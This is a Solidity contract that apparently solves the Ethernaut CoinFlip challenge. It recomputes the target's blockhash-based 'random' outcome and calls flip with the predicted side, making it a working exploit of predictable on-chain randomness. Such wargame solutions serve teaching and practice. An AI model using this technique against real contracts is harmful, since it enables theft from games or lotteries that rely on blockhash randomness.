// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

import "./CoinFlip.sol";


contract CoinFlipSolver is Ownable {

    using SafeMath for uint256;

    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address coinFlipAddress) public Ownable() {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function updateCoinFlip(address coinFlipAddress) public onlyOwner {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function guessCoinFlip() public onlyOwner {
    
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 flip = blockValue.div(FACTOR);
        bool side = flip == 1 ? true : false;
        coinFlip.flip(side);

    }

}
